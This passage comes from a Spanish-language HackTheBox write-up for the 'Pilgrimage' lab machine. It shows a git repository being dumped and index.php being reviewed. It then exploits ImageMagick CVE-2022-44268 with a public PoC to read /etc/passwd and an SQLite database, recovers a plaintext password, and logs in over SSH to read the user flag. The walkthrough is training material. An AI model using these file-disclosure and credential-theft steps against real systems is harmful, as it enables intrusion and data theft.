+[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
+[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
+[-] Running git checkout .
+</code></pre></div><p>Tenemos estos archivos fuente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">tree</span>
+.
+├── assets
+│   ├── bulletproof.php
+│   ├── css
+│   │   ├── animate.css
+│   │   ├── custom.css
+│   │   ├── flex-slider.css
+│   │   ├── fontawesome.css
+│   │   ├── owl.css
+│   │   └── templatemo-woox-travel.css  
+│   ├── images
+│   │   ├── banner-04.jpg
+│   │   └── cta-bg.jpg
+│   ├── js
+│   │   ├── custom.js
+│   │   ├── isotope.js
+│   │   ├── isotope.min.js
+│   │   ├── owl-carousel.js
+│   │   ├── popup.js
+│   │   └── tabs.js
+│   └── webfonts
+│       ├── fa-brands-400.ttf
+│       ├── fa-brands-400.woff2
+│       ├── fa-regular-400.ttf
+│       ├── fa-regular-400.woff2
+│       ├── fa-solid-900.ttf
+│       ├── fa-solid-900.woff2
+│       ├── fa-v4compatibility.ttf
+│       └── fa-v4compatibility.woff2
+├── dashboard.php
+├── index.php
+├── login.php
+├── logout.php
+├── magick
+├── register.php
+└── vendor
+    ├── bootstrap
+    │   ├── css
+    │   │   └── bootstrap.min.css
+    │   └── js
+    │       └── bootstrap.min.js
+    └── jquery
+        ├── jquery.js
+        ├── jquery.min.js
+        ├── jquery.min.map
+        ├── jquery.slim.js
+        ├── jquery.slim.min.js
+        └── jquery.slim.min.map
+
+11 directories, 37 files
+</code></pre></div><p>Parece una aplicación web PHP. Además, no hay más información en el repositorio de Git:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> branch
+* <span class="code-dark-green">master</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">git</span> log
+<span class="code-dark-yellow">commit e1a40beebc7035212efdcb15476f9c994e3634a7 (<span class="code-cyan">HEAD -&gt; </span><span class="code-green">master</span>)</span>  
+Author: emily &lt;emily@pilgrimage.htb&gt;
+Date:   Wed Jun 7 20:11:48 2023 +1000
+
+    Pilgrimage image shrinking service initial commit.
+</code></pre></div><p>Bueno, tal vez el nombre de usuario <code>emily</code> sea relevante.</p><h3 id="análisis-del-código-fuente">Análisis del código fuente</h3><p>El archivo PHP principal es <code>index.php</code>. Este es el código PHP relevante:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk7">session_start</span><span class="mtk1">();</span>
+<span class="mtk5">require_once</span><span class="mtk1"> </span><span class="mtk4">"assets/bulletproof.php"</span><span class="mtk1">;</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">isAuthenticated</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7">json_encode</span><span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'user'</span><span class="mtk1">]));</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">returnUsername</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $_SESSION[</span><span class="mtk4">'user'</span><span class="mtk1">] </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">if</span><span class="mtk1"> ($_SERVER[</span><span class="mtk4">'REQUEST_METHOD'</span><span class="mtk1">] </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">'POST'</span><span class="mtk1">) {</span>
+<span class="mtk1">  $image </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> Bulletproof\</span><span class="mtk7 mtki">Image</span><span class="mtk1">($_FILES);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">($image[</span><span class="mtk4">"toConvert"</span><span class="mtk1">]) {</span>
+<span class="mtk1">    $image</span><span class="mtk5">-&gt;</span><span class="mtk8">setLocation</span><span class="mtk1">(</span><span class="mtk4">"/var/www/pilgrimage.htb/tmp"</span><span class="mtk1">);</span>
+<span class="mtk1">    $image</span><span class="mtk5">-&gt;</span><span class="mtk8">setSize</span><span class="mtk1">(</span><span class="mtk6">100</span><span class="mtk1">, </span><span class="mtk6">4000000</span><span class="mtk1">);</span>
+<span class="mtk1">    $image</span><span class="mtk5">-&gt;</span><span class="mtk8">setMime</span><span class="mtk1">(</span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk4">'png'</span><span class="mtk1">,</span><span class="mtk4">'jpeg'</span><span class="mtk1">));</span>
+<span class="mtk1">    $upload </span><span class="mtk5">=</span><span class="mtk1"> $image</span><span class="mtk5">-&gt;</span><span class="mtk8">upload</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">($upload) {</span>
+<span class="mtk1">      $mime </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">".png"</span><span class="mtk1">;</span>
+<span class="mtk1">      $imagePath </span><span class="mtk5">=</span><span class="mtk1"> $upload</span><span class="mtk5">-&gt;</span><span class="mtk8">getFullPath</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">mime_content_type</span><span class="mtk1">($imagePath) </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"image/jpeg"</span><span class="mtk1">) {</span>
+<span class="mtk1">        $mime </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">".jpeg"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      $newname </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">uniqid</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk7">exec</span><span class="mtk1">(</span><span class="mtk4">"/var/www/pilgrimage.htb/magick convert /var/www/p</span><span class="mtk4">ilgrimage.htb/tmp/"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $upload</span><span class="mtk5">-&gt;</span><span class="mtk8">getName</span><span class="mtk1">() </span><span class="mtk5">.</span><span class="mtk1"> $mime </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">" -resize 50% /var/www/pilgrimage.htb/shrunk/"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $newname </span><span class="mtk5">.</span><span class="mtk1"> $mime);</span>  
+<span class="mtk1">      </span><span class="mtk7">unlink</span><span class="mtk1">($upload</span><span class="mtk5">-&gt;</span><span class="mtk8">getFullPath</span><span class="mtk1">());</span>
+<span class="mtk1">      $upload_path </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk4 detected-link">http://pilgrimage.htb/shrunk/</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $newname </span><span class="mtk5">.</span><span class="mtk1"> $mime;</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'user'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        $db </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">PDO</span><span class="mtk1">(</span><span class="mtk4">'sqlite:/var/db/pilgrimage'</span><span class="mtk1">);</span>
+<span class="mtk1">        $stmt </span><span class="mtk5">=</span><span class="mtk1"> $db</span><span class="mtk5">-&gt;</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk5">INSERT INTO</span><span class="mtk4"> `images` (</span><span class="mtk5">url</span><span class="mtk4">,original,username) </span><span class="mtk5">VALUES</span><span class="mtk4"> (?,?,?)</span><span class="mtk4">"</span><span class="mtk1">);</span>
+<span class="mtk1">        $stmt</span><span class="mtk5">-&gt;</span><span class="mtk8">execute</span><span class="mtk1">(</span><span class="mtk7">array</span><span class="mtk1">($upload_path,$_FILES[</span><span class="mtk4">"toConvert"</span><span class="mtk1">][</span><span class="mtk4">"name"</span><span class="mtk1">],$_SESSION[</span><span class="mtk4">'user'</span><span class="mtk1">]));</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">"Location: /?message="</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $upload_path </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">"&amp;status=success"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">"Location: /?message=Image shrink failed&amp;status=fa</span><span class="mtk4">il"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">"Location: /?message=Image shrink failed&amp;status=fa</span><span class="mtk4">il"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>Podemos ver que el archivo subido debe ser una imagen (formato PNG o JPEG). El servidor usa <a href="https://imagemagick.org">ImageMagick</a> para procesar el archivo de imagen. Podríamos pensar en formas de explotar una vulnerabilidad de inyección de comandos aquí:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">      </span><span class="mtk7">exec</span><span class="mtk1">(</span><span class="mtk4">"/var/www/pilgrimage.htb/magick convert /var/www/p</span><span class="mtk4">ilgrimage.htb/tmp/"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $upload</span><span class="mtk5">-&gt;</span><span class="mtk8">getName</span><span class="mtk1">() </span><span class="mtk5">.</span><span class="mtk1"> $mime </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">" -resize 50% /var/www/pilgrimage.htb/shrunk/"</span><span class="mtk1"> </span><span class="mtk5">.</span><span class="mtk1"> $newname </span><span class="mtk5">.</span><span class="mtk1"> $mime);</span>  
+</code></pre></div><p>Pero el nombre de archivo se desinfecta con <code>Bulletproof</code>, por lo que la inyección no es posible.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Se sabe que <a href="https://imagemagick.org">ImageMagick</a> tiene un montón de vulnerabilidades y, por lo tanto, un montón de <em>exploits</em>. De hecho, hay una vulnerabilidad reciente que otorga lectura de archivos locales (<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-44268">CVE-2022-44268</a>). Más información sobre esta vulnerabilidad <a href="https://www.metabaseq.com/imagemagick-zero-days/">aquí</a>. Se puede encontrar un <em>exploit</em> en <a href="https://github.com/Sybil-Scan/imagemagick-lfi-poc">imagemagick-lfi-poc</a>.</p><p>Veamos cómo podemos leer <code>/etc/passwd</code>, por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">imagemagick-lfi-poc/generate.py</span> -f /etc/passwd -o exploit.png
+
+   [<span class="code-green">&gt;</span>] ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;  
+   [<span class="code-green">&gt;</span>] Generating Blank PNG
+   [<span class="code-green">&gt;</span>] Blank PNG generated
+   [<span class="code-green">&gt;</span>] Placing Payload to read /etc/passwd
+   [<span class="code-green">&gt;</span>] PoC PNG generated &gt; exploit.png
+</code></pre></div><p>Ahora subimos este archivo de imagen:</p><p><img src="/images/HTB/Pilgrimage/Pilgrimage-2.webp" alt="Pilgrimage 2"></p><p>Y obtenemos una URL con la imagen procesada:</p><p><img src="/images/HTB/Pilgrimage/Pilgrimage-3.webp" alt="Pilgrimage 3"></p><p>Ahora el archivo de imagen contiene <code>/etc/passwd</code> en los metadatos <code>Raw Profile Type</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q http://pilgrimage.htb/shrunk/649a2a09bd257.png
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exiftool</span> <span class="mtku">649a2a09bd257.png</span>
+ExifTool Version Number         : 12.60
+File Name                       : 649a2a09bd257.png
+Directory                       : .
+File Size                       : 1688 bytes
+File Modification Date/Time     : 2023:06:27 02:15:05+02:00
+File Access Date/Time           : 2023:06:27 02:17:00+02:00
+File Inode Change Date/Time     : 2023:06:27 02:16:59+02:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 128
+Image Height                    : 128
+Bit Depth                       : 8
+Color Type                      : RGB
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Gamma                           : 2.2
+White Point X                   : 0.3127
+White Point Y                   : 0.329
+Red X                           : 0.64
+Red Y                           : 0.33
+Green X                         : 0.3
+Green Y                         : 0.6
+Blue X                          : 0.15
+Blue Y                          : 0.06
+Background Color                : 255 255 255
+Modify Date                     : 2023:06:27 00:15:05
+Raw Profile Type                : ..    1437.726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d.6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f.6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e.2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269.6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f.62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d.65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a.2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a.783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372.2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73.706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31.303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f.6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573.722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d.646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b.75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f.7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69.7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67.696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73.62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d.5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e.6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334.3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e.2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374.656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72.6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65.6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e.0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052.65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f.6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973.74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573.796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69.7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c.6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d.652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78.3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f.7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f.737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938.3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a.  
+Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
+Datecreate                      : 2023-06-27T00:15:05+00:00
+Datemodify                      : 2023-06-27T00:15:05+00:00
+Datetimestamp                   : 2023-06-27T00:15:05+00:00
+Image Size                      : 128x128
+Megapixels                      : 0.016
+</code></pre></div><p>Podemos usar <code>identify</code> de <a href="https://imagemagick.org">ImageMagick</a> para extraer el contenido:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">identify</span> -verbose <span class="mtku">649a2a09bd257.png</span>
+Image:
+  ...
+
+    Raw profile type:
+
+    1437
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
+6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
+2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
+6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
+62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
+65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
+2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
+783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
+2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
+706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
+303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
+6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
+722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
+646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
+75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
+7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
+7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
+696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
+62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
+5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
+6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
+3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
+2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
+656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
+6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
+6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
+0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
+65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
+6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
+74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
+796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
+7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
+6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
+652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
+3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
+7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
+737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
+3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
+
+    signature: e881558c35046fa634a9acd154bbb27903b59c018f14e2dfbd398aba4f497bd5  
+
+  ...
+</code></pre></div><p>Podemos tomar el trozo en hexadecimal de arriba y decodificarlo para leer el archivo <code>/etc/passwd</code> de la máquina:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">vim</span> etc_passwd.hex
+
+<span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> -r -p <span class="mtku">etc_passwd.hex</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
+emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</code></pre></div><p>Como se puede ver, podemos confirmar que <code>emily</code> es un usuario de sistema. Podríamos vernos tentados a leer <code>/home/emily/.ssh/id_rsa</code> o <code>/home/emily/user.txt</code>, pero <code>www-data</code> no tiene permiso para leer esos archivos.</p><p>En su lugar, podemos intentar leer <code>/var/db/pilgrimage</code>, que es un archivo de base de datos SQLite que aparece en <code>index.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        $db </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">PDO</span><span class="mtk1">(</span><span class="mtk4">'sqlite:/var/db/pilgrimage'</span><span class="mtk1">);</span>  
+</code></pre></div><p>Una vez que repitamos el proceso anterior para <code>/var/db/pilgrimage</code>, obtendremos el archivo de la base de datos. Entonces, volcareemos la tabla <code>users</code> y encontraremos una contraseña en texto claro para <code>emily</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">pilgrimage</span>
+pilgrimage: SQLite 3.x database, last written using SQLite version 3034001, file counter 69, database pages 5, cookie 0x4, schema 4, UTF-8, version-valid-for 69  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">sqlite3</span> <span class="mtku">pilgrimage</span>
+SQLite version 3.39.5 2022-10-14 20:58:05
+Enter ".help" for usage hints.
+sqlite&gt; .tables
+images  users
+sqlite&gt; .header on
+sqlite&gt; select * from users;
+username|password
+emily|abigchonkyboi123
+</code></pre></div><p>Afortunadamente, esta contraseña funciona para conectarse a la máquina a través de SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> emily@pilgrimage.htb
+emily@pilgrimage.htb's password:  
+<span class="code-green">emily@pilgrimage</span>:<span class="code-blue">~</span>$ cat user.txt
+10fbe26920d512e05fb451458ab7fa17
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Después de hacer una enumeración básica, descubrimos que <code>root</code> está ejecutando estos comandos periódicamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">emily@pilgrimage</span>:<span class="code-blue">~</span>$ ps -faux | grep ^root
+root           2  0.0  0.0      0     0 ?        S    06:39   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I&lt;   06:39   0:00  \_ [rcu_gp]
+...
+root        1745  0.0  0.0      0     0 ?        I    10:15   0:00  \_ [kworker/0:0]
+root           1  0.0  0.2  98268  9952 ?        Ss   06:39   0:01 /sbin/init
+root         503  0.0  0.2  48412 11092 ?        Ss   06:40   0:00 /lib/systemd/systemd-journald
+root         525  0.0  0.1  21848  5532 ?        Ss   06:40   0:00 /lib/systemd/systemd-udevd
+root         567  0.0  0.2  47748 10208 ?        Ss   06:40   0:00 /usr/bin/VGAuthService
+root         568  0.0  0.1 236744  7576 ?        Ssl  06:40   0:12 /usr/bin/vmtoolsd
+root         573  0.0  0.0  87060  2148 ?        S&lt;sl 06:40   0:00 /sbin/auditd
+root         641  0.0  0.0   6744  2900 ?        Ss   06:40   0:00 /usr/sbin/cron -f
+root         644  0.0  0.0   6816  3048 ?        Ss   06:40   0:00 /bin/bash /usr/sbin/malwarescan.sh
+root         654  0.0  0.0   2516   708 ?        S    06:40   0:00  \_ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
+root         655  0.0  0.0   6816  2316 ?        S    06:40   0:00  \_ /bin/bash /usr/sbin/malwarescan.sh
+root         646  0.0  0.6 209752 26856 ?        Ss   06:40   0:00 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
+root         647  0.0  0.1 220796  6828 ?        Ssl  06:40   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         651  0.0  0.1  13852  7092 ?        Ss   06:40   0:00 /lib/systemd/systemd-logind
